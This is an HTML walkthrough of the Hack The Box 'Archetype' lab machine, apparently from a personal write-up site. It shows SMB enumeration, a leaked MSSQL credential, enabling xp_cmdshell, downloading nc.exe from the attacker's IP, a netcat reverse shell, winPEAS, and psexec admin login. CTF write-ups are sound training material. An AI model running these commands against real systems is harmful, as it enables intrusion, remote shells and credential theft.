@@ -1,0 +1,350 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <link rel="stylesheet" href="css/code.css">
+        <link rel="stylesheet" href="../../css/prism.css">
+        <script src="../../js/prism.js"></script>
+        <script src="js/copycode.js"></script>
+        <script type="module"
+            src="https://unpkg.com/@deckdeckgo/highlight-code@latest/dist/deckdeckgo-highlight-code/deckdeckgo-highlight-code.esm.js"></script>
+    </head>
+    <body>
+
+        <pre>
+            
+            Starting point window machine <a href="https://app.hackthebox.com/starting-point">https://app.hackthebox.com/starting-point</a>
+
+            <b>
+                Step 1 (Scanning) :
+            </b>
+
+            First, we will scan our target machine using Nmap to see what services are running.
+
+            
+            <div class="container">
+                <deckgo-highlight-code id="codeToCopy">
+                    <code slot="code">
+                        nmap -sC -sV -A [Target_IP]
+                    </code></deckgo-highlight-code>
+                <button id="copyButton">Copy</button>
+            </div>
+
+            <img src="/public/images/Archetype/Archetype-1.png"/>
+
+            <img src="/public/images/Archetype/Archetype-2.png"/>
+
+            So we can conclude from here is :
+            * RPC on 135
+            * netBios-ssn (samba) on 139
+            * MsSql on 1433
+
+            Run SmbClient in order to get what is there. Use this command to access the
+            main directories present on the server:
+
+            <div class="container">
+                <deckgo-highlight-code id="codeToCopy">
+                    <code slot="code">
+                        smbclient -N -L \\\\[Target_IP]\\
+                    </code></deckgo-highlight-code>
+                <button id="copyButton">Copy</button>
+            </div>
+
+            <img src="/public/images/Archetype/Archetype-3.png"/>
+
+            We can see that there is a backup folder here so let’s navigate to ‘backups’
+            and get the contents (in our case there is only one file here useful for us “prod.dtsConfig”) :
+
+            <div class="container">
+                <deckgo-highlight-code id="codeToCopy">
+                    <code slot="code">
+                        smbclient -N \\\\[Target_IP]\\backups
+                        smb: \> ls
+                        smb: \> get prod.dtsConfig
+                    </code></deckgo-highlight-code>
+                <button id="copyButton">Copy</button>
+            </div>
+
+            <img src="/public/images/Archetype/Archetype-4.png"/>
+
+            Let’s use ls to see what is accessible on this backup.
+
+            Looks like the only thing here is a file called prod.dtsConfig. Using the ‘get’
+            command we saw on the previous list, let us see if we can take this file home to our machine
+
+            <img src="/public/images/Archetype/Archetype-5.png"/>
+
+            Excellent! Exit the SMB shell and take a look using cat to figure out what is in this file.
+
+            [IMP !] Now this file will be stored in our local machine in the same folder
+            where our smbclient is running
+
+            Let’s Analyse our file 
+
+            <img src="/public/images/Archetype/Archetype-6.png"/>
+
+            Password: M3g4c0rp123
+            User : Archetype/sql_svc
+
+            <div class="container">
+                <deckgo-highlight-code id="codeToCopy">
+                    <code slot="code">
+                        mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth
+                    </code></deckgo-highlight-code>
+                <button id="copyButton">Copy</button>
+            </div>
+
+            <img src="/public/images/Archetype/Archetype-7.png"/>
+
+            Now we logged in but what we can do here. So let’s research and find a way if
+            can execute the command shell from our mssqlclient.py and here we found something :
+
+            <img src="/public/images/Archetype/Archetype-8.png"/>
+
+            xp_cmdshell let’s try this
+
+            <div class="container">
+                <deckgo-highlight-code id="codeToCopy">
+                    <code slot="code">
+                        EXEC xp_cmdshell 'net-user'
+                    </code></deckgo-highlight-code>
+                <button id="copyButton">Copy</button>
+            </div>
+
+            First, we need to check our Roles on the server :
+
+            <div class="container">
+                <deckgo-highlight-code id="codeToCopy">
+                    <code slot="code">
+                        SELECT is_srvrolemember('sysadmin');
+                    </code></deckgo-highlight-code>
+                <button id="copyButton">Copy</button>
+            </div>
+
+            Follow these steps :
+
+            <div class="container">
+                <deckgo-highlight-code id="codeToCopy">
+                    <code slot="code">
+                        EXECUTE sp_configure 'show advanced options',1;
+                        RECONFIGURE;
+                        EXECUTE sp_configure 'xp_cmdshell',1;
+                        RECONFIGURE;
+                    </code></deckgo-highlight-code>
+                <button id="copyButton">Copy</button>
+            </div>
+
+            Now try running :
+
+                        <div class="container">
+                <deckgo-highlight-code id="codeToCopy">
+                    <code slot="code">
+                        xp_cmdshell "whoami"
+                    </code></deckgo-highlight-code>
+                <button id="copyButton">Copy</button>
+            </div>
+
+            Now it’s working and this command will return us “archetype/sql_svc”.
+
+            <B>
+                (Stable shell):
+            </B>
+
+            Our shell is working but we won’t be executing our commands like this again
+            so we will get a stable shell. Now let’s search and find something.
+            After some searching we found an article:
+
+            <a href="https://pentestwiki.org/academy/how-to-get-a-xp_cmdshell-reverse-shell/">
+                https://pentestwiki.org/academy/how-to-get-a-xp_cmdshell-reverse-shell/
+            </a>
+
+            We will follow the last method: xp_cmdshell with nc
+
+            Here first we have to download nc.exe on our local system, which can be
+            downloaded from the link:
+
+            <A href="https://github.com/int0x33/nc.exe/blob/master/nc.exe">
+                https://github.com/int0x33/nc.exe/blob/master/nc.exe
+            </A>
+
+            After downloading let’s set up a python server on our machine in order to
+            send the file to the target system.
+
+            <div class="container">
+                <deckgo-highlight-code id="codeToCopy">
+                    <code slot="code">
+                        python3 -m http.server// Keep in mind to run the server in the folder yout nc.exe file is present
+                    </code></deckgo-highlight-code>
+                <button id="copyButton">Copy</button>
+            </div>
+
+            We will use the following command to get the file on our target system:
+
+            <div class="container">
+                <deckgo-highlight-code id="codeToCopy">
+                    <code slot="code">
+                        xp_cmdshell "powershell.exe wget http://[Your_tun0_IP]:8000/nc.exe -OutFile c:\\Users\Public\\nc.exe"/*
+                        we don't need the rest of the command because :
+                        . we already are connected to sql
+                        . we already logged in using correct credentials
+                        */
+                    </code></deckgo-highlight-code>
+                <button id="copyButton">Copy</button>
+            </div>
+
+            If our file is successfully transferred we will get something like this in our server instance
+
+            <div class="container">
+                <deckgo-highlight-code id="codeToCopy">
+                    <code slot="code">
+                    root@ip-10-10-204-169:~# python3 -m http.server
+                    Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+                    10.129.102.63 - - [22/Feb/2022 09:12:04] "GET /nc.exe HTTP/1.1" 200 -
+                    </code></deckgo-highlight-code>
+                <button id="copyButton">Copy</button>
+            </div>
+
+            The next step is to execute the file in our target system for the reverse
+            shell. So for that first, let’s set up our Netcat listener on our system:
+
+            <div class="container">
+                <deckgo-highlight-code id="codeToCopy">
+                    <code slot="code">
+                    nc -lvnp 4444
+                    </code></deckgo-highlight-code>
+                <button id="copyButton">Copy</button>
+            </div>
+
+            We will execute the following command in our target system
+
+                        <div class="container">
+                <deckgo-highlight-code id="codeToCopy">
+                    <code slot="code">
+                    xp_cmdshell "c:\\Users\Public\\nc.exe -e cmd.exe [Your_tun0_IP] 4444"
+                    </code></deckgo-highlight-code>
+                <button id="copyButton">Copy</button>
+            </div>
+
+            <b>
+                (Finding Our Flags and Privilege Escalation):
+            </b>
+
+            So we got our stable shell so our next step is to find the flags. So user flag is
+            in the Dekstop folder and we can navigate to that folder :
+
+                                    <div class="container">
+                <deckgo-highlight-code id="codeToCopy">
+                    <code slot="code">
+                    cd \
+                    cd Users
+                    cd sql_svc
+                    cd Desktop
+                    type user.txt
+                    </code></deckgo-highlight-code>
+                <button id="copyButton">Copy</button>
+            </div>
+
+            <img src="/public/images/Archetype/Archetype-9.png"/>
+
+            <img src="/public/images/Archetype/Archetype-10.png"/>
+
+            Finally, in order to prepare for the next set of boxes as well as the root flag,
+            we can check the powershell history and see what the last commands executed are.
+
+            <img src="/public/images/Archetype/Archetype-11.png"/>
+
+            Now we have the administrator password, and this is something we want to
+            keep in mind for future boxes in this set.
+
+            We can run psexec.py to log in to the administrator account, and use the new
+            password to gain access.
+
+            <img src="/public/images/Archetype/Archetype-12.png"/>
+
+            Once again, after this we are able to find the flag on the desktop.
+
+            <img src="/public/images/Archetype/Archetype-13.png"/>
+
+            Here comes Privilege Escalation
+
+            We need something that can tell us the weak points in the system so that We
+            can exploit them and get the root access and we can’t do this manually
+            because it will be a lengthy process upon searching we found something known as “Winpeas”
+
+            <img src="/public/images/Archetype/Archetype-14.png"/>
+
+            Winpeas is an extremely useful tool to enumerate the system for us and find weaknesses.
+
+            Download Winpeas into our system using the link:
+
+            <a href="https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe">
+                https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe
+            </a>
+
+            Set up our python server
+
+            <div class="container">
+                <deckgo-highlight-code id="codeToCopy">
+                    <code slot="code">
+                    python3 -m http.server
+                    </code></deckgo-highlight-code>
+                <button id="copyButton">Copy</button>
+            </div>
+
+            Get our file in our target system. We need to switch to PowerShell
+            because cmd.exe doesn’t have wget:
+
+            <div class="container">
+                <deckgo-highlight-code id="codeToCopy">
+                    <code slot="code">
+                    powershellwget http://[Your_tun0_IP]:8000/winPEASx64.exe -outfile winPEASx64.exe
+                    </code></deckgo-highlight-code>
+                <button id="copyButton">Copy</button>
+            </div>
+
+            Confirm the transfer as we did above when we were transferring “nc.exe”
+            Now run the tool using the command: “./winPEASx64.exe”
+            After running at the end we get some output as:
+
+            <img src="/public/images/Archetype/Archetype-15.png"/>
+
+            Notice the file named “ConsoleHost_history.txt”. Let’s navigate to this file and see what’s in there.
+
+
+            <div class="container">
+                <deckgo-highlight-code id="codeToCopy">
+                    <code slot="code">
+                    cd \
+                    cd Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline
+                    type ConsoleHost_history.txt
+                    </code></deckgo-highlight-code>
+                <button id="copyButton">Copy</button>
+            </div>
+
+            <img src="/public/images/Archetype/Archetype-16.png"/>
+
+            Now we need a tool to log in as Administrator on our target PC and we
+            cannot do it directly in our Windows Powershell as we do in the Linux
+            system. There is a tool from our impacket named psexec.py which will help us.
+
+            Kill the PowerShell and mssqlclient on our machine.
+
+            Let’s use our tool:
+
+            <div class="container">
+                <deckgo-highlight-code id="codeToCopy">
+                    <code slot="code">
+                    python3 /opt/impacket/examples/psexec.py administrator@[Target_IP]
+                    </code></deckgo-highlight-code>
+                <button id="copyButton">Copy</button>
+            </div>
+
+            Here we have our Shell with Root Access
+
+            <img src="/public/images/Archetype/Archetype-17.png"/>
+
+            Now let’s navigate to our Administrator Desktop to claim our Root flag 
+
+            <img src="/public/images/Archetype/Archetype-18.png"/>
+
+        </pre>
+    </body>
